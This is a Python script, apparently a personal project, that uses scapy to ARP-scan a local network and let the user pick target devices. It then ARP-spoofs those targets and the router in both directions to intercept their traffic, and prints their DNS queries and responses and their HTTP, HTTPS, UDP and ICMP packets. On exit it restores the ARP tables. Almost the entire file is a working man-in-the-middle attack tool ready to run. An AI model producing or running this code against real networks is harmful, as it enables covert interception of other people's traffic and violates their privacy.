import threading
from getmac import get_mac_address
import scapy.all as scapy
import ipaddress
import time

icmp_types = {
    0: "Echo Reply",
    3: "Destination Unreachable",
    4: "Source Quench",
    5: "Redirect",
    8: "Echo Request",
    9: "Router Advertisement",
    10: "Router Solicitation",
    11: "Time Exceeded",
    12: "Parameter Problem",
    13: "Timestamp Request",
    14: "Timestamp Reply",
    15: "Information Request",
    16: "Information Reply"
}

icmp_codes = {
    0: "No Code",
    1: "Host Unreachable",
    2: "Protocol Unreachable",
    3: "Port Unreachable",
    4: "Fragmentation Needed and Don't Fragment was Set",
    5: "Source Route Failed",
    6: "Destination Network Unknown",
    7: "Destination Host Unknown",
    8: "Source Host Isolated",
    9: "Communication with Destination Network is Administratively Prohibited",
    10: "Communication with Destination Host is Administratively Prohibited",
    11: "Network Unreachable for ToS",
    12: "Host Unreachable for ToS"
}

# function gets the subnet mask in either CIDR notation or dotted dicimal format that is changed to CIDR.
def get_mask():
    while True:
        subnet_mask = input("Enter the subnet mask (e.g. 255.255.255.0 or 1-32): ")
        try:
            # If it's just a number (CIDR)
            if subnet_mask.isdigit() and 1 <= int(subnet_mask) <= 32:
                return subnet_mask
            
            # If dotted decimal
            mask = ipaddress.IPv4Network(f"0.0.0.0/{subnet_mask}", strict=False)
            return str(mask.prefixlen)  # Convert to CIDR
        except (ValueError, ipaddress.NetmaskValueError):
            print("Invalid subnet mask. Please enter a valid mask.")

# scans the network for devices and stores their IP and MAC addresses in a dictionary.
def scan(default_gateway, mask, targetdict, my_ip):
    #used a while loop instead of recrusive function to avoid recursion limit issues
    while True:
        print("the router's ip: ", default_gateway+"/"+mask)
        response,_ = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=default_gateway+"/"+mask),
            timeout=5,
            verbose=0
        )
        # skip device that were already found, my  ip and the router's ip
        for packet in response:
            if packet.answer.psrc in targetdict or packet.answer.psrc == my_ip or packet.answer.psrc == default_gateway:
                    continue
            # add the device to the targetdict
            targetdict[packet.answer.psrc] = packet.answer.hwsrc
        # if no devices were found ask the user if they want to scan again
        if not targetdict:
            print("No live devices found in the network. would you like to scan again? (y/n): ")
            if input().lower() != 'y':
                print("Exiting the program.")
                return
        #else print the found devices
        else:
            print("Live devices found: ")
            for key, value in targetdict.items():
                print(f"IP: {key}, MAC: {value}")
            break

# sniff packets and call handler
def sniff_packets(target_list, my_mac):
    scapy.sniff(  filter=f"ether src not {my_mac}" ,prn=lambda pkt: packet_handler(pkt, target_list), store=False)
    
# function gets the packets and prints them
def packet_handler(pkt, target_list):
    try:   
        #skip layer 2 packets and if targets where not picked yet
        if not target_list or scapy.IP not in pkt:
         return
        ip_src = pkt[scapy.IP].src
        ip_dst = pkt[scapy.IP].dst  
        proto_num = pkt[scapy.IP].proto
        if ip_src in target_list or ip_dst in target_list  :
            if proto_num in Handle_Prints:
                Handle_Prints[proto_num](pkt)
            else:
                print(f"[{str(proto_num)}] {ip_src} -> {ip_dst} : {pkt.summary()}")
    except Exception as e:
        print(f"Error processing packet: {e}")
        return

def handle_udp(pkt):
    try:
        if pkt.haslayer(scapy.DNS):
            dns = pkt[scapy.DNS]
            if dns.qr == 0:  # query
                print(f"[DNS QUERY] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : {dns.qd.qname.decode()}")
            elif dns.qr == 1:  # response
                answers = dns.an
                if answers:
                    for answer in answers:
                        if answer.type == 1:  # A record map to an IPv4 address
                            print(f"[DNS RESPONSE] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : {answer.rrname.decode()} -> {answer.rdata}")
        else :
            print(f"[UDP] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : {pkt.summary()}")
    except Exception as e:
        print(f"Error while processing packet: {e}")

def handle_icmp(pkt):
    try:
        icmp = pkt[scapy.ICMP]
        print(f"[ICMP] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : type: {icmp_types.get(icmp.type,str(icmp.type))}, code: {icmp_codes.get(icmp.code,str(icmp.code))}, payload: {icmp.payload.summary()}")
    except Exception as e:
        print(f"Error while processing packet: {e}")

def handle_tcp(pkt):
    try:
        if pkt.haslayer(scapy.TCP):
            tcp = pkt[scapy.TCP]
            if tcp.dport == 443:
                print(f"[HTTPS] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : {tcp.summary()}")
            elif tcp.dport == 80:
                print(f"[HTTP] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : {tcp.summary()}")   
            else:  
                print(f"[TCP] {pkt[scapy.IP].src} -> {pkt[scapy.IP].dst} : {tcp.summary()}")
    except Exception as e:
        print(f"Error while processing packet: {e}")

Handle_Prints = {
    1: handle_icmp,
    6: handle_tcp,
    17: handle_udp,
}

# function  spoofs the target IP address with the source IP address and my MAC address.
def spoof(Target_ip, Target_mac, Src_ip, my_mac, stop_event):
    arp_response = scapy.ARP(pdst=Target_ip, hwdst=Target_mac, psrc=Src_ip, op='is-at',)
    ether = scapy.Ether(dst=Target_mac)
    packet = ether / arp_response
    print("currently spoofing: " + Target_ip + " with " + my_mac + " as the source MAC address")
    while not stop_event.is_set():
        try:
            scapy.sendp(packet, count=2, verbose=0)
            time.sleep(2)
        except Exception as e:
            print(f"Error sending spoofed packet: {e}")
    print(f"stopped spoofing {Src_ip}")

def restore(default_gateway, router_mac, targets):
    for target_ip, target_mac in targets.items():
        # send the correct ARP information to the target and the router to restore the connection
        arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=default_gateway, hwsrc=router_mac, op='is-at')
        ether = scapy.Ether(dst=target_mac)
        packet = ether / arp_response
        scapy.sendp(packet, count=8, verbose=0)        
        # also restore the connection on the router side           
        arp_response = scapy.ARP(pdst=default_gateway, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac, op='is-at')
        ether = scapy.Ether(dst=router_mac)
        packet = ether / arp_response
        scapy.sendp(packet, count=8, verbose=0) 

        print(f"Restored connection for {target_ip}")
  
def pick_targets(default_gateway, mask, target_dict, my_ip):
    PickedTargets = {}
    while True:
        key = input("Enter the target IP address to spoof (press enter to continue, 'cntl c' to quit, 's' to rescan, 'a' to pick all): ").lower()
        if key == 's':
            scan(default_gateway, mask, target_dict, my_ip)
            continue
        if key == 'a':
            return target_dict
        if key == "" and len(PickedTargets) != 0:
            return PickedTargets
        if key in target_dict:
            PickedTargets[key] = target_dict[key]
        else:
            print("please enter an existing device from the list above ^^^")

def main():
    default_gateway = input("Enter the default gateway: ")
    router_mac = get_mac_address(ip=default_gateway)
    mask = get_mask()
    threads = []
    targetdict ={}
    sniff_targets = []
    my_ip=scapy.get_if_addr(scapy.conf.iface)
    my_mac=scapy.get_if_hwaddr(scapy.conf.iface)
    scan(default_gateway, mask, targetdict, my_ip)
    # if no devices were found exit the program
    if not targetdict:
        return
    # create one sniffer process
    sniffer_proc = threading.Thread(target=sniff_packets, args=(sniff_targets,my_mac),daemon=True)
    sniffer_proc.start()
    threads.append(sniffer_proc)
    stop_event=threading.Event()
    try:
        targets = pick_targets(default_gateway, mask, targetdict, my_ip)
        for key, value in targets.items():
            sniff_targets.append(key)
            t1 = threading.Thread(target=spoof, args=(key, value, default_gateway, my_mac, stop_event))
            t2 = threading.Thread(target=spoof, args=(default_gateway, router_mac, key,my_mac, stop_event))
            t1.start()
            t2.start()
            threads.append(t1)
            threads.append(t2)
            time.sleep(2)
        # wait for all processes to finish
        print("All threads started. Press Ctrl+C to stop.")      
        # keep the main thread alive to listen for KeyboardInterrupt
        while True:
            input()
    except KeyboardInterrupt:
        print("cntl c was pressed, stopping ARP spoofing and restoring connection..")
        stop_event.set()
        for t in threads[1::]:  # skip the sniffer thread it will exit as its daemon
            t.join()
        restore(default_gateway, router_mac, targets)
if __name__ == "__main__":
    main()


